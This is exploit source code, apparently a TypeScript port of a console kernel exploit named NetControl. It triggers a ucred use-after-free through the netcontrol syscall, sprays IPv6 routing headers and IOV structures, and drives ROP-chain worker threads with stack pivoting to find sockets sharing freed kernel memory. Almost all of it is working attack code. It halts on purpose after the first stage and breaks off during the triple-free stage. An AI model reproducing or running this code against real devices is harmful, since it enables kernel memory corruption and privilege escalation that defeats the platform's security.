// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
// ============================================================================
import { fn, syscalls, BigInt, mem, gadgets, utils } from 'download0/types'
import { libc_addr } from 'download0/userland'

include('userland.js')

utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')

// Socket constants (FreeBSD)
const AF_UNIX = 1
const AF_INET6 = 28
const SOCK_STREAM = 1
const IPPROTO_IPV6 = 41

// IPv6 socket option constants
const IPV6_RTHDR = 51
const IPV6_RTHDR_TYPE_0 = 0

// Spray parameters
const UCRED_SIZE = 0x168
const MSG_HDR_SIZE = 0x30
const IOV_SIZE = 0x10
const MSG_IOV_NUM = 0x17
const IPV6_SOCK_NUM = 128  // Matching Poops.java
const RTHDR_TAG = 0x13370000

// Retry parameters (matching Poops.java)
const TWIN_TRIES = 15000  // Matching Poops.java
const UAF_TRIES = 50000   // Matching Poops.java

// NetControl constants
const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

// Check required syscalls are available
const required_syscalls = [
  { num: 0x03, name: 'read' },
  { num: 0x04, name: 'write' },
  { num: 0x06, name: 'close' },
  { num: 0x17, name: 'setuid' },
  { num: 0x29, name: 'dup' },
  { num: 0x1B, name: 'recvmsg' },
  { num: 0x61, name: 'socket' },
  { num: 0x63, name: 'netcontrol' },
  { num: 0x69, name: 'setsockopt' },
  { num: 0x76, name: 'getsockopt' },
  { num: 0x87, name: 'socketpair' }
]

const missing = []
for (let i = 0; i < required_syscalls.length; i++) {
  if (!syscalls.map.has(required_syscalls[i]!.num)) {
    missing.push(required_syscalls[i]!.name)
  }
}

if (missing.length > 0) {
  log('ERROR: Required syscalls not found: ' + missing.join(', '))
  throw new Error('Required syscalls not found')
}

// ============================================================================
// STAGE 1: Setup - Create IPv6 sockets and initialize pktopts
// ============================================================================

log('=== NetControl ===')

// Register syscall wrappers using fn.register()
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
fn.register(0x69, 'setsockopt', ['number', 'number', 'number', 'bigint', 'number'], 'bigint')
fn.register(0x76, 'getsockopt', ['number', 'number', 'number', 'bigint', 'bigint'], 'bigint')
fn.register(0x06, 'close_sys', ['number'], 'bigint')
fn.register(0x29, 'dup_sys', ['number'], 'bigint')
fn.register(0x1B, 'recvmsg', ['number', 'bigint', 'number'], 'bigint')

// Use syscall number 0x63 for netcontrol
// Note: Java uses dlsym to get __sys_netcontrol wrapper, but fn.register with syscall number
// should call the libkernel wrapper automatically
if (!syscalls.map.has(0x63)) {
  throw new Error('Syscall 0x63 (netcontrol) not found in syscalls.map!')
}
const netcontrol_wrapper = syscalls.map.get(0x63)!
log('netcontrol wrapper address: ' + netcontrol_wrapper.toString())
fn.register(0x63, 'netcontrol_sys', ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
log('Registered netcontrol_sys (syscall 0x63)')

fn.register(0x03, 'read_sys', ['number', 'bigint', 'number'], 'bigint')
fn.register(0x04, 'write_sys', ['number', 'bigint', 'number'], 'bigint')
fn.register(0x17, 'setuid_sys', ['number'], 'bigint')
fn.register(0x14B, 'sched_yield', [], 'bigint')
fn.register(0x1B0, 'thr_self', [], 'bigint')  // FreeBSD uses thr_self, not gettid
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')

// Create shorthand references
const socket = fn.socket
const socketpair = fn.socketpair
const setsockopt = fn.setsockopt
const getsockopt = fn.getsockopt
const close_sys = fn.close_sys
const dup_sys = fn.dup_sys
const recvmsg = fn.recvmsg
const netcontrol_sys = fn.netcontrol_sys
const read_sys = fn.read_sys
const write_sys = fn.write_sys
const setuid_sys = fn.setuid_sys
const sched_yield = fn.sched_yield
const cpuset_setaffinity = fn.cpuset_setaffinity
const rtprio_thread = fn.rtprio_thread

// Extract syscall wrapper addresses for ROP chains from syscalls.map
const read_wrapper = syscalls.map.get(0x03)!
const write_wrapper = syscalls.map.get(0x04)!
const recvmsg_wrapper = syscalls.map.get(0x1B)!

// Threading using scePthreadCreate
// int32_t scePthreadCreate(OrbisPthread *, const OrbisPthreadAttr *, void*(*F)(void*), void *, const char *)
const scePthreadCreate_addr = libc_addr.add(new BigInt(0, 0x340))
fn.register(scePthreadCreate_addr, 'scePthreadCreate', [], 'bigint')
const scePthreadCreate = fn.scePthreadCreate

log('Using scePthreadCreate at: ' + scePthreadCreate_addr.toString())

// Pre-allocate all buffers once (reuse throughout exploit)
const store_addr = mem.malloc(0x100)
const rthdr_buf = mem.malloc(UCRED_SIZE)
const optlen_buf = mem.malloc(8)

log('store_addr: ' + store_addr.toString())
log('rthdr_buf: ' + rthdr_buf.toString())

// Storage for IPv6 sockets
const ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
let socket_count = 0

log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

// Create IPv6 sockets using socket()
// Note: socket() auto-throws on error in new API, no need for manual checks
for (let i = 0; i < IPV6_SOCK_NUM; i++) {
  const fd = socket(AF_INET6, SOCK_STREAM, 0)

  // Store as number in Int32Array (handle both BigInt and plain number)
  ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
  socket_count++
}

log('Created ' + socket_count + ' IPv6 sockets')

if (socket_count !== IPV6_SOCK_NUM) {
  log('FAILED: Not all sockets created')
  throw new Error('Failed to create all sockets')
}

log('Initializing pktopts on all sockets...')

// Initialize pktopts by calling setsockopt with NULL buffer
// Note: setsockopt() auto-throws on error, so all calls that don't throw succeeded
for (let i = 0; i < IPV6_SOCK_NUM; i++) {
  setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
}

log('Initialized ' + IPV6_SOCK_NUM + ' pktopts')

// Build IPv6 routing header template
// Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
const rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
mem.view(rthdr_buf).setUint8(0, 0) // ip6r_nxt
mem.view(rthdr_buf).setUint8(1, rthdr_len) // ip6r_len
mem.view(rthdr_buf).setUint8(2, IPV6_RTHDR_TYPE_0) // ip6r_type
mem.view(rthdr_buf).setUint8(3, rthdr_len >> 1) // ip6r_segleft
const rthdr_size = (rthdr_len + 1) << 3

log('Built routing header template (size=' + rthdr_size + ' bytes)')

// ============================================================================
// STAGE 2: Trigger ucred triple-free and find twins/triplet
// ============================================================================

// Allocate buffers
let set_buf = mem.malloc(8)
let clear_buf = mem.malloc(8)
const leak_rthdr_buf = mem.malloc(UCRED_SIZE)
const leak_len_buf = mem.malloc(8)
const tmp_buf = mem.malloc(8)

// Global constiables
const twins = [-1, -1]
let uaf_sock = -1

// Try socketpair using fn.register() approach
log('Attempting socketpair...')

const sp_buf = mem.malloc(8)
log('Allocated socketpair buffer at: ' + sp_buf.toString())

socketpair(1, 1, 0, sp_buf)

// Extract FD values from buffer (syscalls auto-throw on error)
const iov_ss0 = mem.view(sp_buf).getUint32(0, true)
const iov_ss1 = mem.view(sp_buf).getUint32(4, true)

log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')

// Prepare msg_iov buffer - use valid addresses, kernel will allocate IOV
const iov_recv_buf = mem.malloc(MSG_IOV_NUM * 8)  // Valid buffer for receiving
const msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
for (let i = 0; i < MSG_IOV_NUM; i++) {
  // Point to valid buffer (kernel will allocate IOV structures with iov_base pointing here)
  mem.view(msg_iov).setBigInt(i * IOV_SIZE, iov_recv_buf.add(new BigInt(0, i * 8)), true)
  mem.view(msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 8), true)
}

// Prepare msg_hdr for recvmsg
const msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.view(msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)                 // msg_name
mem.view(msg_hdr).setUint32(0x08, 0, true)                           // msg_namelen
mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)                     // msg_iov
mem.view(msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
mem.view(msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)                 // msg_control
mem.view(msg_hdr).setUint32(0x28, 0, true)                           // msg_controllen
mem.view(msg_hdr).setUint32(0x2C, 0, true)                           // msg_flags

// Prepare IOV for kernel corruption (iov_base=1 will be interpreted as cr_refcnt)
// Java only sets the FIRST iovec, rest are zeros
const corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
mem.view(corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
mem.view(corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
// Rest of iovecs remain zero (default from malloc)

const corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
mem.view(corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)     // msg_iov
mem.view(corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
mem.view(corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags

log('Prepared IOV spray structures')

// ============================================================================
// Persistent Worker Pool (matching Poops.java)
// ============================================================================

const IOV_WORKER_NUM = 4  // Matching Poops.java IOV_THREAD_NUM
const thr_exit_wrapper = syscalls.map.get(0x1AF)

// Check if cpuset_setaffinity and rtprio_thread exist in syscalls.map
let cpuset_setaffinity_wrapper: BigInt | null = null
if (!syscalls.map.has(0x1E8)) {
  log('WARNING: Syscall 0x1E8 (cpuset_setaffinity) not in map, workers will not be pinned to CPU')
} else {
  cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8)!
}

let rtprio_thread_wrapper: BigInt | null = null
if (!syscalls.map.has(0x1D2)) {
  log('WARNING: Syscall 0x1D2 (rtprio_thread) not in map, workers will not have realtime priority')
} else {
  rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
}

fn.register(0x1C7, 'thr_new', ['bigint', 'bigint'], 'bigint')
const thr_new = fn.thr_new

interface Worker {
  ctrl_sock0: number
  ctrl_sock1: number
  stack_size: number
  stack: BigInt
  tls: BigInt
  child_tid: BigInt
  parent_tid: BigInt
  thr_param: BigInt
  signal_buf: BigInt
  corrupt_msg_iov: BigInt
  corrupt_msg_hdr: BigInt
  cpumask: BigInt
  rtp: BigInt
  rop_stack_size: number
  rop_stack: BigInt
  saved_rsp: BigInt
}
// Worker pool - each worker has its own resources
const workers: Worker[] = []
for (let w = 0; w < IOV_WORKER_NUM; w++) {
  const worker: Worker = {} as Worker

  // Control socketpair for signaling this worker
  const ctrl_sp_buf = mem.malloc(8)
  socketpair(1, 1, 0, ctrl_sp_buf)
  worker.ctrl_sock0 = mem.view(ctrl_sp_buf).getUint32(0, true)
  worker.ctrl_sock1 = mem.view(ctrl_sp_buf).getUint32(4, true)

  // Worker resources
  worker.stack_size = 0x1000
  worker.stack = mem.malloc(worker.stack_size)
  worker.tls = mem.malloc(0x40)
  worker.child_tid = mem.malloc(8)
  worker.parent_tid = mem.malloc(8)
  worker.thr_param = mem.malloc(0x80)
  worker.signal_buf = mem.malloc(1)

  // Each worker gets its own corrupt_msg_iov and corrupt_msg_hdr to avoid race conditions
  worker.corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
  mem.view(worker.corrupt_msg_iov).setBigInt(0, new BigInt(0, 1), true)  // iovec[0].iov_base = 1
  mem.view(worker.corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_len = 1
  // Rest of iovecs remain zero

  worker.corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
  mem.view(worker.corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x10, worker.corrupt_msg_iov, true)  // msg_iov
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen
  mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
  mem.view(worker.corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
  mem.view(worker.corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags

  // CPU affinity structures for this worker (matching Poops.java IovThread)
  worker.cpumask = mem.malloc(0x10)
  mem.view(worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
  mem.view(worker.cpumask).setUint16(0, 1 << 4, true)  // Pin to CPU 4

  // Realtime priority structure for this worker
  worker.rtp = mem.malloc(4)
  mem.view(worker.rtp).setUint16(0, 2, true)    // RTP_PRIO_REALTIME
  mem.view(worker.rtp).setUint16(2, 256, true)  // priority 256

  // Separate ROP stack for infinite looping
  worker.rop_stack_size = 0x2000  // Larger stack for ROP chain
  worker.rop_stack = mem.malloc(worker.rop_stack_size)
  worker.saved_rsp = mem.malloc(8)  // Save initial RSP for pivoting back

  workers.push(worker)
}

log('Created ' + IOV_WORKER_NUM + ' worker slots')

// Build ROP chain for a worker: infinite loop with stack pivoting
// Each worker has its own ROP stack that gets restored after each iteration
function buildWorkerROP (worker: Worker) {
  const rop = []

  // Pin to CPU 4: cpuset_setaffinity(3, 1, -1, 0x10, worker.cpumask) - if available
  if (cpuset_setaffinity_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 3))  // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 1))  // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(0xffffffff, 0xffffffff))  // id = -1
    rop.push(gadgets.POP_RCX_RET)
    rop.push(new BigInt(0, 0x10))  // setsize
    rop.push(gadgets.POP_R8_RET)
    rop.push(worker.cpumask)
    rop.push(cpuset_setaffinity_wrapper)
  }

  // Set realtime priority: rtprio_thread(1, 0, worker.rtp) - if available
  if (rtprio_thread_wrapper !== null) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(new BigInt(0, 1))  // RTP_SET
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(0, 0))  // lwpid = 0
    rop.push(gadgets.POP_RDX_RET)
    rop.push(worker.rtp)
    rop.push(rtprio_thread_wrapper)
  }

  // Calculate loop start address
  const rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  // Count gadgets above: cpuset (10 if available) + rtprio (7 if available)
  let setup_gadgets = 0
  if (cpuset_setaffinity_wrapper !== null) setup_gadgets += 10
  if (rtprio_thread_wrapper !== null) setup_gadgets += 7
  const loop_start_offset = setup_gadgets * 8
  const loop_start_rsp = rop_stack_top.sub(new BigInt(0, loop_start_offset))

  // LOOP START - workers return here after pivoting
  // Wait for work signal: read(ctrl_sock0, buf, 1) - blocks until signaled
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(read_wrapper)

  // Do work: recvmsg(iov_ss0, worker.corrupt_msg_hdr, 0)
  // Allocates IOV in kernel, blocks until data arrives
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(iov_ss0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.corrupt_msg_hdr)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 0))
  rop.push(recvmsg_wrapper)

  // Signal work done: write(ctrl_sock1, buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(worker.ctrl_sock1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(worker.signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0, 1))
  rop.push(write_wrapper)

  // Pivot RSP back to loop start and continue
  rop.push(gadgets.POP_RSP_RET)
  rop.push(loop_start_rsp)  // RSP = loop start, next RET goes to read()

  return rop
}

// Spawn a worker thread (only called once - workers loop via stack pivoting)
function spawnWorker (worker_idx: number) {
  const worker = workers[worker_idx]
  if (!worker) {
    throw new Error('Invalid worker index: ' + worker_idx)
  }

  // Reset TID values
  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)

  // Build and write ROP chain to dedicated ROP stack
  const rop = buildWorkerROP(worker)
  let rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  for (let i = rop.length - 1; i >= 0; i--) {
    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
    mem.view(rop_stack_top).setBigInt(0, rop[i]!, true)
  }

  // Write pivot target to thread's initial stack
  // Thread starts with RSP = stack + stack_size, so write at top of stack
  const initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
  const pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)  // Value for POP_RSP_RET

  // Setup thr_param
  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)

  return thr_new(worker.thr_param, new BigInt(0, 0x68))
}

// Spawn all workers ONCE - they loop infinitely via stack pivoting
log('Spawning ' + IOV_WORKER_NUM + ' looping workers (stack pivoting)...')
for (let w = 0; w < IOV_WORKER_NUM; w++) {
  const ret = spawnWorker(w)
  if (!ret.eq(0)) {
    throw new Error('Failed to spawn worker ' + w + ': ' + ret.toString())
  }
}
log('All workers spawned - they will loop infinitely without respawn!')

// Pin main thread to CPU core 4 and set real-time priority
log('Pinning main thread to CPU 4 with real-time priority...')

// Pin to CPU 4
const CPU_LEVEL_WHICH = 3  // CPU_LEVEL_WHICH
const CPU_WHICH_TID = 1    // CPU_WHICH_TID
const MAIN_CORE = 4        // CPU core 4
const CPU_SET_SIZE = 0x10  // 16 bytes
const main_cpumask = mem.malloc(CPU_SET_SIZE)
// Zero out the buffer
mem.view(main_cpumask).setBigInt(0, new BigInt(0, 0), true)
mem.view(main_cpumask).setBigInt(8, new BigInt(0, 0), true)
// Set bit for CPU 4 using 16-bit short (matching Java putShort)
mem.view(main_cpumask).setUint16(0, 1 << MAIN_CORE, true)

cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, new BigInt(0xffffffff, 0xffffffff), CPU_SET_SIZE, main_cpumask)

// Set real-time priority
const RTP_SET = 1
const RTP_PRIO_REALTIME = 2
const main_rtp = mem.malloc(4)
mem.view(main_rtp).setUint16(0, RTP_PRIO_REALTIME, true)  // offset 0x00: type = 2
mem.view(main_rtp).setUint16(2, 256, true)                 // offset 0x02: prio = 256
rtprio_thread(RTP_SET, 0, main_rtp)

log('Main thread pinned to CPU 4 and set to real-time priority')

// IOV spray using single worker (matching Poops.java for precise stages)
// Worker 0 only - used for double-free and triple-free setup
function doIOVSpraySingle () {
  const worker = workers[0]
  if (!worker) {
    throw new Error('Worker 0 not found!')
  }
  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
  write_sys(worker.ctrl_sock1, worker.signal_buf, 1)
  sched_yield()

  // Write ONE byte to iov_ss1 - wakes worker 0
  write_sys(iov_ss1, worker.signal_buf, 1)

  // Wait for worker 0 to signal completion (matching Java: iovState.waitForFinished())
  const done = read_sys(worker.ctrl_sock0, worker.signal_buf, 1)
  const done_val = (done instanceof BigInt) ? done.lo : done
  if (done_val !== 1) {
    throw new Error('Worker 0 did not signal completion! read returned: ' + done_val)
  }

  // Read ONE byte back from iov_ss0 (matching Java: read(iovSs0, tmp, Int8.SIZE))
  const consumed = read_sys(iov_ss0, worker.signal_buf, 1)
  const consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
  if (consumed_val !== 1) {
    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
  }

  // Worker auto-loops via stack pivoting - no respawn needed
}

// IOV spray using all workers (for better coverage when needed)
function doIOVSpray () {
  // Signal all workers to start
  for (let w = 0; w < IOV_WORKER_NUM; w++) {
    const worker = workers[w]
    if (!worker) {
      throw new Error('Worker ' + w + ' not found!')
    }
    write_sys(worker.ctrl_sock1, worker.signal_buf, 1)
  }

  // Yield to let workers enter recvmsg (IOV allocated here!)
  sched_yield()

  // Write ONE byte to iov_ss1 - wakes ALL workers since they're all blocking on iov_ss0
  write_sys(iov_ss1, workers[0]!.signal_buf, 1)

  // Wait for all workers to signal completion
  for (let w = 0; w < IOV_WORKER_NUM; w++) {
    const worker = workers[w]
    if (!worker) {
      throw new Error('Worker ' + w + ' not found!')
    }
    const done = read_sys(worker.ctrl_sock0, worker.signal_buf, 1)
    const done_val = (done instanceof BigInt) ? done.lo : done
    if (done_val !== 1) {
      throw new Error('Worker ' + w + ' did not signal completion! read returned: ' + done_val)
    }
  }

  // Read ONE byte back from iov_ss0
  const consumed = read_sys(iov_ss0, workers[0]!.signal_buf, 1)
  const consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
  if (consumed_val !== 1) {
    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
  }

  // Workers automatically pivot RSP back and loop - no respawn needed!
}

// ============================================================================
// Trigger ucred UAF setup
// ============================================================================

// Create dummy socket to register and close
const dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
const dummy_sock = ((dummy_sock_result instanceof BigInt) ? dummy_sock_result.lo : dummy_sock_result) & 0xFFFFFFFF
log('Created dummy socket: ' + dummy_sock)

// Register dummy socket with netcontrol
set_buf = mem.malloc(8)
mem.view(set_buf).setUint32(0, dummy_sock, true)
const set_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE), set_buf, new BigInt(0, 8))
log('netcontrol SET_QUEUE returned: ' + ((set_ret instanceof BigInt) ? set_ret.toString() : set_ret))

// Close dummy socket
close_sys(dummy_sock)
log('Closed dummy socket')

// Allocate new ucred
setuid_sys(1)

// Reclaim the file descriptor
const uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
uaf_sock = uaf_sock_result.lo & 0xFFFFFFFF
log('Created uaf_sock: ' + uaf_sock)

// Free the previous ucred (now uaf_sock's f_cred has cr_refcnt=1)
setuid_sys(1)

// Unregister and free the file and ucred
clear_buf = mem.malloc(8)
mem.view(clear_buf).setUint32(0, uaf_sock, true)
const clear_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE), clear_buf, new BigInt(0, 8))
log('netcontrol CLEAR_QUEUE returned: ' + ((clear_ret instanceof BigInt) ? clear_ret.toString() : clear_ret))

// Set cr_refcnt back to 1 with IOV spray (32 iterations matching Poops.java lines 823-829)
log('Resetting cr_refcnt with IOV spray (32 iterations, worker 0 only)...')
for (let reset_i = 0; reset_i < 32; reset_i++) {
  doIOVSpraySingle()  // Match Java: only worker 0
}

// Double free ucred (only dup works - doesn't check f_hold)
// Matching Java: no wait between IOV spray and double-free
const dup_fd = dup_sys(uaf_sock)
const dup_fd_num = (dup_fd instanceof BigInt) ? dup_fd.lo : dup_fd
log('dup_sys returned: ' + dup_fd_num + ' (should be >= 0)')
if (dup_fd_num < 0) {
  throw new Error('dup_sys failed with: ' + dup_fd_num)
}
close_sys(dup_fd_num)
log('Double freed ucred via close(dup(' + uaf_sock + ')) where dup_fd=' + dup_fd_num)

// Find twin sockets (two sockets sharing the same kernel rthdr)
log('Finding twins...')

let found_twins = false

// Set leak_len_buf once outside loop to reduce memory allocations
mem.view(leak_len_buf).setUint32(0, 8, true)

// Reuse single view to avoid creating new DataViews
const rthdr_view = mem.view(rthdr_buf)
const leak_view = mem.view(leak_rthdr_buf)

for (let twin_attempts = 0; twin_attempts < TWIN_TRIES; twin_attempts++) {
  // Yield every 10 attempts to prevent memory buildup
  if (twin_attempts > 0 && twin_attempts % 10 === 0) {
    sched_yield()
  }

  // Progress logging every 100 attempts
  if (twin_attempts > 0 && twin_attempts % 100 === 0) {
    log('  Twin search progress: ' + twin_attempts + '/' + TWIN_TRIES + ' attempts...')

    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory) {
      log('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc)
    }
  }

  // Combined spray and check loop to reduce iterations and memory
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    // Spray tag to this socket
    rthdr_view.setUint32(4, RTHDR_TAG | i, true)
    setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
  }

  // Check all sockets for twins
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    getsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

    const val = leak_view.getUint32(4, true)
    const j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
      twins[0] = i
      twins[1] = j
      found_twins = true
      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr (attempt ' + (twin_attempts + 1) + ')')
      break
    }
  }

  if (found_twins) break
}

if (!found_twins) {
  throw new Error('Failed to find twins after ' + TWIN_TRIES + ' attempts')
}

log('=== SUCCESS: Twins found! Stopping here for testing ===')
log('Twin sockets: [' + twins[0] + ', ' + twins[1] + ']')
utils.notify('NetControl: Twins found!')
throw new Error('STOP: Twins found - halting before triple-free')

// ============================================================================
// Triple-free setup
// ============================================================================
log('=== Triple-freeing ucred ===')

// Free one twin's rthdr
setsockopt(ipv6_sockets[twins[1]!]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
log('Freed rthdr on socket[' + twins[1] + ']')

// Set cr_refcnt back to 1 by spraying IOV until first_int == 1 (matching Java lines 837-853)
log('Spraying IOV to reset cr_refcnt for triple-free...')
let uaf_timeout = UAF_TRIES
while (uaf_timeout-- > 0) {
  const worker = workers[0]!
  if (!worker) {
    throw new Error('Worker 0 not found!')
  }
  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
  write_sys(worker.ctrl_sock1, worker.signal_buf, 1)
  sched_yield()

  // Check if reclaim succeeded (matching Java: leakRthdr.getInt(0x00) == 1)
  mem.view(leak_len_buf).setUint32(0, 8, true)
  getsockopt(ipv6_sockets[twins[0]!]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

  if (mem.view(leak_rthdr_buf).getUint32(0, true) === 1) {
    log('IOV reclaim successful (first_int = 1) after ' + (UAF_TRIES - uaf_timeout) + ' attempts')
    break
  }

  // Complete IOV spray (matching Java: write → waitForFinished → read)
  write_sys(iov_ss1, worker.signal_buf, 1)
  read_sys(worker.ctrl_sock0, worker.signal_buf, 1)
  read_sys(iov_ss0, worker.signal_buf, 1)
  // Worker auto-loops via stack pivoting - no respawn needed
}

if (uaf_timeout <= 0) {
  throw new Error('IOV reclaim failed after ' + UAF_TRIES + ' attempts')
}

const triplets = [-1, -1, -1]
triplets[0] = twins[0]!

// Triple free ucred (second time)
const dup_fd2 = dup_sys(uaf_sock)
close_sys(dup_fd2.lo)
log('Triple-freed ucred via close(dup(uaf_sock))')

// Helper function to find triplet
function findTriplet (master: number, other: number) {
  const max_attempts = 50000
  let attempt = 0

  while (attempt < max_attempts) {
    // Spray rthdr on all sockets except master and other
    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }
      mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
      setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
    }

    // Check for triplet by reading from master
    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }

      mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
      getsockopt(ipv6_sockets[master]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

      const val = mem.view(leak_rthdr_buf).getUint32(4, true)
      const j = val & 0xFFFF

      if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
        return j
      }
    }

    attempt++
  }

  return -1
}

// Find triplet[1] - a third socket sharing the same rthdr
log('Finding triplet[1]...')
triplets[1] = findTriplet(triplets[0]!, -1)
